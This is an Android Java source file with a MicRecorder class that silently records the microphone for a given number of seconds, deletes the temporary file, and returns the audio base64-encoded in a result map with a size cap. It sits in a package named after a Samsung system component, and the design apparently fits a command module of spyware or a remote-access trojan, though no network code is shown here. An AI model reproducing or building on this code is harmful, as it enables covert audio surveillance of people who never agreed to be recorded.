package com.samsung.android.usersuite;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Map;

public class MicRecorder {

    public static Map<String, Object> record(Context ctx, int seconds) {
        Map<String, Object> out = new HashMap<>();
        if (ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            out.put("error", "no mic permission");
            return out;
        }

        File tmp = new File(ctx.getCacheDir(), "rec_" + System.currentTimeMillis() + ".m4a");
        MediaRecorder mr = null;
        try {
            mr = new MediaRecorder();
            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mr.setAudioEncodingBitRate(64000);
            mr.setAudioSamplingRate(16000);
            mr.setOutputFile(tmp.getAbsolutePath());
            mr.prepare();
            mr.start();
            Thread.sleep(seconds * 1000L);
            mr.stop();

            byte[] body = new byte[(int) tmp.length()];
            FileInputStream in = new FileInputStream(tmp);
            int total = 0;
            while (total < body.length) {
                int r = in.read(body, total, body.length - total);
                if (r < 0) break;
                total += r;
            }
            in.close();

            if (total > 900 * 1024) {
                out.put("error", "recording too big (" + total + " bytes)");
            } else {
                out.put("body", Base64.encodeToString(body, Base64.NO_WRAP));
                out.put("size", total);
                out.put("dur", seconds);
            }
        } catch (Exception e) {
            out.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
        } finally {
            if (mr != null) mr.release();
            tmp.delete();
        }
        return out;
    }
}
